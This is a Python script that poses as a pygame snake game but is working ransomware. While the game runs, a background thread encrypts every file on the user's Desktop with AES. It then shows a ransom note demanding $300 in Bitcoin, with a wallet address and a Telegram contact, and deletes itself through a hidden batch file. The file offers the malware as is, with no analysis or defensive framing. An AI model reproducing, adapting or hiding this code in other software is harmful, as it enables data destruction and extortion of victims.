import os
import sys
import glob
import base64
import pygame
import secrets
import random
import tkinter as tk
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import threading

# Paths for encryption
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
pictures_path = os.path.join(os.path.expanduser("~"), "Pictures")
key_path = os.path.join(pictures_path, "encryption_key.txt")

# Generate Encryption Key
def generate_key():
    key = secrets.token_bytes(32)
    with open(key_path, "wb") as f:
        f.write(base64.urlsafe_b64encode(key))
    return key

# Encrypt File Function
def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            plaintext = f.read()
        iv = secrets.token_bytes(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded_plaintext = plaintext + b" " * (16 - len(plaintext) % 16)
        ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
        with open(file_path, "wb") as f:
            f.write(iv + ciphertext)
    except PermissionError:
        pass

# Encrypt All Files
def encrypt_all_files():
    key = generate_key()
    files = glob.glob(os.path.join(desktop_path, "*"))
    for file in files:
        if os.path.isfile(file) and file != key_path and not file.endswith((".ini", ".lnk")):
            encrypt_file(file, key)

# ----------------------------- MESSAGE WINDOW (TKINTER) -----------------------------

def show_warning_message():
    root = tk.Tk()
    root.title("Oops!")
    root.configure(bg='black')

    window_width = 800
    window_height = 400
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - (window_width // 2)
    y = (screen_height // 2) - (window_height // 2)
    root.geometry(f"{window_width}x{window_height}+{x}+{y}")

    root.resizable(False, False)
    root.attributes('-topmost', True)

    message = """
Oops! Your files have been encrypted.

If you see this text, your files are no longer accessible.
You might have been looking for a way to recover your files.
Don’t waste your time. No one will be able to recover them without our
decryption service.

We guarantee that you can recover all your files safely and easily. All you need to do is submit the payment and contact us.

Please follow the instructions:

Send $300 worth of Bitcoin to the following address:

1Qz7153HMuxbTuQ2R1t78mGSdzafNtNbBLX

After sending, contact us on Telegram: @decrypt_support7777
...
"""

    label = tk.Label(
        root,
        text=message,
        font=("Courier", 11),
        fg="red",
        bg="black",
        justify="left",
        anchor="nw",
        wraplength=760
    )
    label.pack(padx=20, pady=20, anchor="nw", fill="both", expand=True)

    root.mainloop()

# ----------------------------- SNAKE GAME CODE -----------------------------

pygame.init()
white = (255, 255, 255)
yellow = (255, 255, 102)
black = (0, 0, 0)
red = (213, 50, 80)
green = (0, 255, 0)
blue = (50, 153, 213)

dis_width = 600
dis_height = 400
dis = pygame.display.set_mode((dis_width, dis_height))
clock = pygame.time.Clock()

snake_block = 10
snake_speed = 15

font_style = pygame.font.SysFont("bahnschrift", 25)
score_font = pygame.font.SysFont("comicsansms", 35)

def our_snake(snake_block, snake_list):
    for x in snake_list:
        pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])

def gameLoop():
    game_over = False
    x1 = dis_width / 2
    y1 = dis_height / 2
    x1_change = 0
    y1_change = 0
    snake_List = []
    Length_of_snake = 1

    foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
    foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0

    while not game_over:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                game_over = True
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT:
                    x1_change = -snake_block
                    y1_change = 0
                elif event.key == pygame.K_RIGHT:
                    x1_change = snake_block
                    y1_change = 0
                elif event.key == pygame.K_UP:
                    y1_change = -snake_block
                    x1_change = 0
                elif event.key == pygame.K_DOWN:
                    y1_change = snake_block
                    x1_change = 0

        if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
            break
        x1 += x1_change
        y1 += y1_change
        dis.fill(blue)
        pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])
        snake_Head = [x1, y1]
        snake_List.append(snake_Head)
        if len(snake_List) > Length_of_snake:
            del snake_List[0]

        for x in snake_List[:-1]:
            if x == snake_Head:
                game_over = True
                break

        our_snake(snake_block, snake_List)
        pygame.display.update()

        if x1 == foodx and y1 == foody:
            foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
            foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
            Length_of_snake += 1

        clock.tick(snake_speed)

    pygame.quit()

# ----------------------------- SELF DELETE -----------------------------

def delete_self():
    script_path = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(os.environ["TEMP"], "del_me.bat")

    with open(bat_path, "w") as bat_file:
        bat_file.write(f"""@echo off
:Repeat
del "{script_path}" >nul 2>&1
if exist "{script_path}" goto Repeat
del "%~f0"
""")

    subprocess.Popen(['cmd', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

# ----------------------------- MAIN -----------------------------

def run_all():
    encryption_thread = threading.Thread(target=encrypt_all_files)
    encryption_thread.daemon = True
    encryption_thread.start()

    gameLoop()

    encryption_thread.join()
    show_warning_message()
    delete_self()

run_all()